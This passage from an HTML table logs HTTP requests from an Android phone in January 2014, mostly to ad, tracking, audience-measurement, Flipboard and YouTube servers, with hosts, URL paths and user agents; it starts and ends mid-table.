      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>94 </th>
      <td> 136891</td>
      <td>  91.103.142.194</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /call2/pubmj/42361/286438/13501/S/5189938149/ngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>95 </th>
      <td> 136893</td>
      <td>  91.103.142.194</td>
      <td>              mobile.smartadserver.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /call2/pubmj/42361/286438/13531/M/5189938149/ngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>96 </th>
      <td> 136866</td>
      <td>    193.46.63.58</td>
      <td>                           mqs.ioam.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   /?mobfaz//CP//222F000006E6//VIA_SZMNG</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>97 </th>
      <td>  79988</td>
      <td>   85.13.149.111</td>
      <td>                  otaslim.slimroms.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                /ota.xml</td>
      <td>                                                                                                                                                                  Dalvik/1.6.0 (Linux; U; Android 4.3.1; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>98 </th>
      <td>    108</td>
      <td> 173.194.116.186</td>
      <td>         pagead2.googlesyndication.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /mads/gma?preqs=0&amp;u_sd=1.6750001&amp;u_h=764&amp;u_w=477&amp;msid=com.icecoldapps.sshserver&amp;js=afma-sdk-a-v4.1.1&amp;format=320x50_mb&amp;net=ed&amp;app_name=6.android.com.icecoldapps.sshserver&amp;u_audio=3&amp;hl=de&amp;u_so=p&amp;output=html&amp;region=mobile_app&amp;u_tz=60&amp;client_sdk=1&amp;ex=1&amp;slotname=a1503fa97c18f71&amp;caps=th_sdkAdmobApiForAds_di&amp;eid=46621027&amp;eisu=YqvG8bb1HRSjHT6fGSlcIGDpDNkVBUb9f6gFzqmi9KKfTIqGDqHqvKRVSjVInYJT89PFhEXFazxoGTMgh8XJGbsG3oecaOzbv8-2l35NcfO9gAwABQhGCOMtM6TYYwID&amp;et=16&amp;jsv=66&amp;urll=499</td>
      <td>                                                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 (Mobile; afma-sdk-a-v4.1.1)</td>
    </tr>
    <tr>
      <th>99 </th>
      <td>  84341</td>
      <td>    2.23.181.210</td>
      <td>                         pbs.twimg.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        /media/Bd5jXUqCIAAz9SB.png:large</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>100</th>
      <td>  45625</td>
      <td>   68.232.35.139</td>
      <td>                         pbs.twimg.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        /media/BeR4oFsIAAAld5J.jpg:large</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>101</th>
      <td> 114951</td>
      <td>   68.232.35.139</td>
      <td>                         pbs.twimg.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        /media/BeVn43ACIAErkDj.jpg:large</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>102</th>
      <td>  89510</td>
      <td>   91.215.101.32</td>
      <td>                          qs.ivwbox.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   /?andropit//CP//forum</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>103</th>
      <td>  89714</td>
      <td>  176.34.124.190</td>
      <td>                   r.skimresources.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /api/?callback=skimlinksApplyHandlers&amp;data=%7B%22pubcode%22%3A%2236706X955308%22%2C%22domains%22%3A%5B%22androidpit.com%22%2C%22androidpit.es%22%2C%22androidpit.ru%22%2C%22androidpit.com.br%22%2C%22androidpit.fr%22%2C%22androidpit.com.tr%22%2C%22androidpit.it%22%2C%22facebook.com%22%2C%22plus.google.com%22%2C%22twitter.com%22%5D%2C%22page%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%7D</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>104</th>
      <td>  62938</td>
      <td>   85.182.250.17</td>
      <td> r6---sn-i5onxoxu-q0nl.googlevideo.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                  /videoplayback?ipbits=0&amp;clen=6565357&amp;sver=3&amp;signature=97BF5AD3E8F190923D6357415BCCA26206AC87CB.98F902F2BF9A3C6AD31B8656D8985D9803C55355&amp;upn=145Xdgf925M&amp;id=1a862b8c290ddd0e&amp;sparams=algorithm%2Cburst%2Cclen%2Cdur%2Cfactor%2Cgir%2Cid%2Cip%2Cipbits%2Citag%2Clmt%2Csource%2Cupn%2Cexpire&amp;ms=au&amp;mv=m&amp;mt=1390068284&amp;key=yt5&amp;ip=89.204.137.61&amp;burst=40&amp;source=youtube&amp;lmt=1389950553436400&amp;mime=video%2F3gpp&amp;expire=1390092857&amp;gir=yes&amp;algorithm=throttle-factor&amp;fexp=933901%2C924614%2C916623%2C936119%2C940607%2C924616%2C936910%2C936913%2C907231%2C921090&amp;itag=36&amp;dur=231.410&amp;factor=1.25&amp;dnc=1&amp;cpn=gO8O40lo6VtiEb9S</td>
      <td>                                                                                                                                                                                          stagefright/1.2 (Linux;Android 4.3.1)</td>
    </tr>
    <tr>
      <th>105</th>
      <td>  62803</td>
      <td>  173.194.70.148</td>
      <td>                           s0.2mdn.net</td>
      <td> GET</td>
      <td> /N4061/pfadx/app.ytpwatch.entertainment/main_8938;dc_kt=AM_2AqHYZ2t6UuW96Ij1LXARDLXamWPArT5qYCXdWdyUCDtpMHFXlTu4GTOjWhX86Meh8fEBDQZuhXDopY43XkUFDcHwp6hyOrzu9GmpYXhJqPfO5kfxRx4_Pr26_98;adtest=nodebugip;sz=480x360,480x361;kvid=GoYrjCkN3Q4;kpu=kontor;kpeid=b3tJ5NKw7mDxyaQ73mwbRg;kpid=8938;mpvid=AATwQoLYU5dkv_Ym;afv=1;afvbase=eJydlEuTojoYhn9Ns9MKd1iwQM_BVtvp9toym1SECFEgMReUfz9p6Jqyz_JQVIU3yXdNHlTTEnzHOWRUEEloA4VEXEamkSkhYYGbHHOtWpJjCs-U10hGtmdUFJM8MjqZ45ZkuNWb3LE9ti2jQpmMLNcMjEbVEOVCW4v82kZo_L0jqwhuZJShEVOnkWeZYWCavuMDJ7T978CowJEJgGcoXkWllOzFjl-sRL_3-33cUSXVCY8zWuuZPjc9zmjKL9PrL3vtGFmJmgZX0Yo0U1Y7AXj4YIeFNF-sCTq3kDRCcoy0-eSAuSQZqqD9Q7g_lPesLNN8lm4QPEvP_OHIdEDwn6Awx3qmk7CtERu-aqargHG8u6_pW7p3dcNgWg9rmV4JQjsYVEOhzZD4K1okZS-Gk-ireDoWODS9n2QC1vREKozYEBZXOhWJSMV0vw3dVKZk9Kgr7VRIS58uZDKKP052YoXX19v6vpiaqKsEKC7kvh9t4Xa5KctlttjNUMrebh8hlA6t0_X7r_Lc3OjsvPxcOtvXWZJcnBvFTvjAaPOWqHxh7i-FkLf9ftJc-MG16iW6rt732WqLiwannRKzx2p__QBrpDarLuzQDCS_T5jvjhMYu5vjEZxFPUs9Z64O0-J-iJdZIb25r_zrKU7_4WfHNx9TkAoCyOzg...</td>
      <td>                                                                                                                                  com.google.android.youtube/5.3.32(Linux; U; Android 4.3.1; de_DE; GT-N7000 Build/JLS36I) gzip</td>
    </tr>
    <tr>
      <th>106</th>
      <td> 136837</td>
      <td>    79.125.16.23</td>
      <td>                   s95.research.de.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        /bb-iqm/get?fp=1</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>107</th>
      <td> 136969</td>
      <td>    79.125.16.23</td>
      <td>                   s95.research.de.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /bb-iqm/get?fp=2&amp;if=Languages%3D2212301001%26display%3D3352655169%26cpu%3D3611081436%26ajax%3D1%26general%3D1912588871%26dotnet%3D410499862%26mathlog%3D747073866%26timezone%3D060%26mimetypes%3D410499862%26silverlight%3D410499862%26pdfplugin%3D0&amp;du=&amp;iu=&amp;ji=6B833F8C-74B7-6A7B-0241-D82D86F0482F</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>108</th>
      <td>  16501</td>
      <td>    79.125.16.23</td>
      <td>                   s95.research.de.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /bb-iqm/get?fp=2&amp;if=Languages%3D2212301001%26display%3D3352655169%26cpu%3D3611081436%26ajax%3D1%26general%3D281224174%26dotnet%3D410499862%26mathlog%3D747073866%26timezone%3D060%26mimetypes%3D410499862%26silverlight%3D410499862%26pdfplugin%3D0&amp;du=&amp;iu=&amp;ji=6B833F8C-74B7-6A7B-0241-D82D86F0482F</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>109</th>
      <td>  87979</td>
      <td>    176.9.190.38</td>
      <td>                  st02.androidpit.info</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /js/libs/modernizr.js?v=2</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>110</th>
      <td>  87978</td>
      <td>    176.9.190.38</td>
      <td>                  st02.androidpit.info</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /style/style.css?v=184</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>111</th>
      <td>  87968</td>
      <td>    176.9.190.38</td>
      <td>                  st02.androidpit.info</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           /styles/basic-migrate.css?v=4</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>112</th>
      <td>  89374</td>
      <td>    176.9.190.38</td>
      <td>                  st02.androidpit.info</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /styles/font/selection_androidpit.ttf?v=3</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>113</th>
      <td>  87977</td>
      <td>    176.9.190.38</td>
      <td>                  st02.androidpit.info</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   /styles/main.css?v=73</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>114</th>
      <td>  87967</td>
      <td>    176.9.190.38</td>
      <td>                  st02.androidpit.info</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /styles/selection_androidpit.css?v=3</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>115</th>
      <td>  88019</td>
      <td>     176.9.200.6</td>
      <td>                  st03.androidpit.info</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /js/common.js?v=129</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>116</th>
      <td>  88022</td>
      <td>     176.9.200.6</td>
      <td>                  st03.androidpit.info</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /js/forum.js?v=42</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>117</th>
      <td>  88999</td>
      <td>     2.16.216.72</td>
      <td>                static.ak.facebook.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /connect/xd_arbiter.php?version=28</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>118</th>
      <td>  16734</td>
      <td>   178.63.27.165</td>
      <td>                     static.plista.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /oba/icon.php?format=gif&amp;color=777777&amp;height=26</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>119</th>
      <td>  90075</td>
      <td>    50.19.234.49</td>
      <td>                    stats.pagefair.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /stats/page_view_event/DF62727623B74063/a.gif?i_hid=false&amp;i_rem=false&amp;i_blk=false&amp;if_hid=false&amp;if_rem=false&amp;s_rem=false&amp;s_blk=false&amp;new_daily=true</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>120</th>
      <td>   3963</td>
      <td>  91.215.101.185</td>
      <td>                    sueddeut.ivwbox.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /cgi-bin/ivw/CP/szmmobil_N061AMucArtM?r=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fmuenchen%252Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;d=1390050885081_71244</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>121</th>
      <td>  16063</td>
      <td>  91.215.101.185</td>
      <td>                    sueddeut.ivwbox.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /cgi-bin/ivw/CP/szmmobil_N124ADigArtM?r=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fdigital%252Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;d=1390051326027_63702</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>122</th>
      <td> 132413</td>
      <td>  91.215.101.185</td>
      <td>                    sueddeut.ivwbox.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   /cgi-bin/ivw/CP/szmmobil_N157AKarArtM?r=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fkarriere%252Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212&amp;d=1390147627053_94457</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>123</th>
      <td> 132333</td>
      <td>   193.46.63.198</td>
      <td>                      sz.met.vgwort.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /na/0a0657787bea4892820a8834ad37ca54</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>124</th>
      <td>   3809</td>
      <td>   193.46.63.198</td>
      <td>                      sz.met.vgwort.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /na/58296e1bbe8446cd8396b668ab180d75</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>125</th>
      <td>  16035</td>
      <td>   193.46.63.198</td>
      <td>                      sz.met.vgwort.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /na/eb98d3d2996f41f5941c53e733c4db8b</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>126</th>
      <td>   9699</td>
      <td>   91.215.101.81</td>
      <td>                    tagessch.ivwbox.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /cgi-bin/ivw/CP/tagesschau/tagesschau;page=/schlusslicht/internet242.html?r=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.tagesschau.de%252Fschlusslicht%252Finternet242.html&amp;d=80627.9287673533</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>127</th>
      <td>  16423</td>
      <td>    37.58.68.190</td>
      <td>                         tags.w55c.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /match-result?id=8bb138bc0446417c9a4df9a0136d0caf8a93328592bf4d059bfc856c256fbc33&amp;ei=GOOGLE&amp;euid=&amp;google_gid=CAESEB5v8HfUGT2_1i1y9vNdT4c&amp;google_cver=1</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>128</th>
      <td>  16424</td>
      <td>    37.58.68.190</td>
      <td>                         tags.w55c.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /match-result?id=8bb138bc0446417c9a4df9a0136d0caf8a93328592bf4d059bfc856c256fbc33&amp;ei=GOOGLE&amp;euid=&amp;google_gid=CAESECkZd52UzYAgxK8IiL5RJDk&amp;google_cver=1</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>129</th>
      <td> 132414</td>
      <td>    37.58.68.190</td>
      <td>                         tags.w55c.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            /rs?id=27f879b4032245c49b707e45f0c1a11b&amp;t=checkout&amp;tx=$TRANSACTION_ID&amp;sku=$SKUS&amp;price=$price</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>130</th>
      <td> 132411</td>
      <td>    37.58.68.190</td>
      <td>                         tags.w55c.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /rs?id=9092f72a92594747b09a1f9d78921f2d&amp;t=homepage</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>131</th>
      <td>  39793</td>
      <td>     69.25.24.26</td>
      <td>                tap.rubiconproject.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /oz/feeds/amazon-rtb/tokens/?rt=img</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>132</th>
      <td>  95516</td>
      <td>   193.46.63.196</td>
      <td>                     taz.met.vgwort.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /na/1239043821a44d96a088d86545a3ff51</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>133</th>
      <td>    946</td>
      <td>  173.194.70.132</td>
      <td>          themes.googleusercontent.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /5GKRInj6vlWTBQ3qIHmAY92S3AaO4PlSJFBLsQ2lUMHp-XwkAwcBjXWzgRfbuUdoGQ7MDjFfnitQ_LEo7vN58KNMcrI=s143</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>134</th>
      <td>    942</td>
      <td>  173.194.70.132</td>
      <td>          themes.googleusercontent.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /XTjCnWNjnmjszjQJR2qqOcmHQ1Irp0L1rI3cMnDMhvjSI8Bxu5DZL7jFOKRAaPg8J20J7rWwtHWk64UyZDrd_MQZkXM=s694-c</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>135</th>
      <td> 102154</td>
      <td>  173.194.70.132</td>
      <td>          themes.googleusercontent.com</td>
      <td> GET</td>
